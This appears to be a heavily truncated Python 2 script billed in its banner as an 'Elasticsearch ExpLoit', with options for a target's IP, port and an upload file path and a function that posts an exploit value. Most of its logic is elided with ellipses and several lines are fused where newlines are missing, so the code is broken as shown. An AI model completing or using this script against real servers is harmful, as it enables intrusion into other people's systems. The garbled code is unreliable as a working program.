#!/usr/bin/env python# by heshang ha.cker@me.com# -*- coding: utf-8 -*-import httplib
import urllib,urllib2
import simplejson
import string
import sys
from optparse import OptionParserprint 'Elasticsearch ExpLoit By Heshang'print '                         2014-06-23'
...
options.add_option('-P', '--path',type='str', default='', help='Upload file\'s path')def post(ip,port,exp):
    ip=ip
    port=port
    path=''
    exp=exp
...
def main():
    ...
    if opts.path !="" :
        ...
        s= s.split('|')
        for i in s:
            print i#.decode("unicode_escape")if __name__ == '__main__':
    main()